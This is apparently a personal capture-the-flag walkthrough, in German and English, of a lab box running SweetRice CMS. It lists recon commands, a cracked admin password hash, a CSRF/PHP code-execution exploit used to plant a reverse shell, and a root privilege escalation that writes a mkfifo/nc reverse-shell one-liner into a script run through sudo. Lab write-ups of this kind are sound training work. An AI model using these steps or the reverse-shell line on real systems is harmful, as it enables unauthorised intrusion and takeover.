	<html>
		
		<h1>recon</h1>
		<h2>NMAP</h2>
		
		nmap -sC -sV -oA nmap/initial {IP der box}

		<h3>Ergebnis</h3>
		22 ssh
		80http

		<h2> HTTP anschauen </h2>

		Apache default page... 

		<h3> Gobuster </h3>

		gobuster dir -u http://{IP der box}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

		<h3> Ergebnis </h3>

		/content 301

		<h3> /content anschauen </h3>

		<p>	
			Welcome to SweetRice - Thank your for install SweetRice as your website management system.
			This site is building now , please come late.

			If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting

			and uncheck the checkbox "Site close" to open your website.

			More help at Tip for Basic CMS SweetRice installed
		</p>

		scheint ein CMS zu sein

		<h2> searchsploit </h2>

		searchsploit sweetrice

		SweetRice 1.5.1 - Backup Disclosure

		mysql einfach cat -&gt; pw hash

		admin: manager

		pw: 42f749ade7f9e195bf475f37a44cafcb

		MD5 cracken -&gt; Password123

		<h2> gobuster auf content </h2>

		gobuster dir -u http://{IP der box}/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt



		/images (Status: 301) - images

		/js (Status: 301) - JS

		/inc (Status: 301) - File acces
		/as (Status: 301) - login
		/_themes (Status: 301) - Files
		/attachment (Status: 301) - File access

		<h2> exploitation </h2>

		<ol>
		<li>mit credentials bei content/as einloggen</li>
		<li>zu ads wechseln</li>
		<li>searchsploit sweetrice</li>
		<li>SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution</li>
		<li>searchsploit -m php/webapps/40700.html</li>
		<li>cat 40700.html</li>
		<li>in eine ad kopieren</li>
		<li>ip adresse anpassen</li>
		<li>speichern</li>
		<li>unter {IP}/content/inc/ads/ file finden und ausfuerhen</li>
		</ol>

		now that we have code execution we ship our reverseshell

		https://github.com/pentestmonkey/php-reverse-shell

		ip mit eigener (tun0) ersetzen und text in Werbung kopieren

		listener starten (nc -lvnp 1234)

		we got a remote shell
		
		<h2> post exploitation </h2>
		
		<h3> upgrade the shell </h3>

		python -c 'import pty; pty.spawn("/bin/bash/")'

		ctrl + z

		stty raw -echo

		fg

		reset

		should work (i got asked what terminal i run, i entered xterm then)

		<h3> privesc </h3>

		sudo -l

		User www-data may run the following commands on THM-Chal:
		(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

		cat /home/itguy/backup.pl

		this file calls another file /etc/copy.sh

		echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {your IP} 9002 >/tmp/f" > /etc/copy.sh

		nc -lvnp 9002

		sudo perl /home/itguy/backup.pl

		and we are done


</html>
